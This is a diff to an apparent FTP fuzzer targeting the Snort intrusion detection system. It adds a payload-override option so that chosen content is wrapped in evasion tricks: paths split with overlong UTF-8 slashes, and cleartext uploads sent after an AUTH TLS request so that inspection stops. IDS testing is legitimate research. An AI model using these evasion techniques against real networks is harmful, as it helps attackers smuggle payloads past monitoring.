@@ -34,7 +34,7 @@ FTP_STRATEGY_LABELS = {
 }
 
 
-def build_ftp_payload(strategy: str) -> bytes:
+def build_ftp_payload(strategy: str, payload_override=None) -> bytes:
     """
     Build a structurally valid FTP command sequence that passes Snort's
     initial FTP classification but triggers faults in deep inspection.
@@ -130,6 +130,12 @@ def build_ftp_payload(strategy: str) -> bytes:
         return preamble + b"SITE EXEC " + arg + b"\r\n"
 
     elif strategy == "encoding_attack":
+        if payload_override is not None:
+            overlong_slash = b'\xc0\xaf'
+            path = overlong_slash.join(
+                [payload_override[i:i+4] for i in range(0, len(payload_override), 4)]
+            )
+            return preamble + b"RETR " + path + b"\r\n"
         # Encoding-based attacks targeting Snort's FTP command normalization.
         # Tests null bytes, UTF-8 BOM, backslash confusion, and overlong UTF-8.
         variant = random.choice([
@@ -366,6 +372,9 @@ def build_ftp_payload(strategy: str) -> bytes:
         if variant == "auth_tls_cleartext":
             # Send AUTH TLS then continue in cleartext — Snort may expect encrypted
             # data after AUTH TLS and stop inspecting, allowing evasion.
+            if payload_override is not None:
+                return (b"AUTH TLS\r\n" + preamble +
+                        b"STOR payload.bin\r\n" + payload_override + b"\r\n")
             lines = [
                 b"AUTH TLS\r\n",
                 preamble,  # continue in cleartext after requesting TLS
@@ -415,11 +424,11 @@ class FtpMutator:
             return [self._external_weights.get(s, 5) for s in self.strategies]
         return FTP_WEIGHTS
 
-    def mutate(self) -> tuple:
+    def mutate(self, payload_override=None) -> tuple:
         """Returns (payload_bytes, strategy_name)."""
         if self._bandit:
             strategy = self._bandit.select_with_weights(self._external_weights or {})
         else:
             strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
-        payload = build_ftp_payload(strategy)
+        payload = build_ftp_payload(strategy, payload_override=payload_override)
         return payload, strategy
